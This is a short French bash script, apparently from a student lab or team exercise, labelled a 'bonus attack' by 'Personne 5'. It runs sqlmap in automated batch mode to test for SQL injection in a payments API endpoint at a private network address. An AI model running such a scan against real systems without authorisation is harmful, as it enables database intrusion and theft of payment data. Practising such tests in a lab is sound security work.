#!/bin/bash
# === Attaque bonus : injection SQL - Personne 5 ===
CIBLE="http://192.168.137.1/api/payments?id=1"
echo "=== Test injection SQL sur $CIBLE ==="
sqlmap -u "$CIBLE" --batch --level=2
echo "=== Fin ==="
